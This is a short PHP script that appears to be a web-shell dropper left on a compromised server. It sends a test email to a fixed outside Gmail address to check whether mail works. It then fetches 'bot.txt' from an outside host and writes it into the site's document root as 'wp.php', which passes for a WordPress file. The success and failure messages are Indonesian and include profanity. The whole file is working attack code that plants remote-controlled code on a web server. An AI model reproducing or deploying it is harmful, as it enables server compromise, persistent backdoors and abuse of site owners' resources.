<?php  
error_reporting( E_ALL );    
$from = $_SERVER['SERVER_ADMIN'];    
$to = "zsamu.indo@gmail.com";    
$subject = "Checking PHP mail";    
$message = "PHP mail berjalan dengan baik";   
$headers = "From:" . $from;
if (mail($to,$subject,$message, $headers)){
    echo "Pesan email sudah terkirim.";
} else{
    echo "Mail Ga Disable";
}

@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$nama = 'wp.php';
$check = $_SERVER['DOCUMENT_ROOT'] . '/'.$nama.'';
$text = http_get('http://www.asukauini.ga/files/bot.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
	echo 'WORK ! <a href="'.$nama.'">JANCOK >{}<</a>';
}else {
	echo 'GAGAL JANCOK';
}
?>